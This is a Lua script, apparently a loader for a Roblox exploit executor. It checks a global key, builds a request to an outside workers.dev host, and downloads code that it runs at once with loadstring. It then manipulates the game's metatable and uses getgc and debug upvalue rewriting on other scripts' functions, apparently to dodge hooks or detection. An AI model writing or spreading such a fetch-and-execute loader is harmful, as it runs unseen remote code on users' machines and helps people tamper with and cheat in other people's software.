if not _G.v or _G.v[3]~='s3'then return end
local h=table.concat(_G.v,'')
local u=string.format("https://small-union-d76e.brunotoledo526.workers.dev//?key=%s&id=%s&vh=%s&f=%s","onecreatorx","${i}",h,"${f}")
local r=game:HttpGet(u)
loadstring(r)()
if '${f}'=='F'then
  spawn(function()
    wait(1)
    local mt=getmetatable(game)
    if mt and mt.__namecall then
      setmetatable(game,{__namecall=mt.__namecall})
    end
    print,warn,error=getfenv().print,getfenv().warn,getfenv().error
    local function rf(f)
      pcall(function()
        for i=1,debug.getinfo(f).nups do
          local n,v=debug.getupvalue(f,i)
          if n=='print'or n=='warn'or n=='error'then
            debug.setupvalue(f,i,getfenv()[n])
          end
        end
      end)
    end
    for _,v in pairs(getgc())do
      if type(v)=="function"and islclosure(v)and not is_synapse_function(v)then
        rf(v)
      end
    end
  end)
end
_G.v=nil
